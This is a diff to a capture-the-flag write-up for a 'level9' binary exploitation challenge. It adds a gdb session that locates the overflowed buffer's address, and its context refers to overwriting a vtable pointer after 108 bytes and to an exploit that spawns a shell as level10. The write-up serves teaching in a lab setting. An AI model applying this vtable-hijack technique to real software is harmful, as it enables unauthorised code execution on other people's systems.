@@ -84,6 +84,21 @@ So: after 108 bytes, we reach and overwrite the vtable pointer.
 
 ---
 
+## Finding the address
+
+```
+(gdb) b *main+136                                    // right after the setAnnotation() call
+Breakpoint 1 at 0x804867c
+(gdb) run 'AAAA'
+Starting program: /home/user/level9/level9 'AAAA'
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:      0x41414141                           // buffer address
+```
+
+---
+
 ## Step 6 — Crafting the Payload
 
 Memory layout we want:
@@ -145,4 +160,5 @@ Exploit command:
 ```
 
 This spawns a shell as **level10**.
+
 
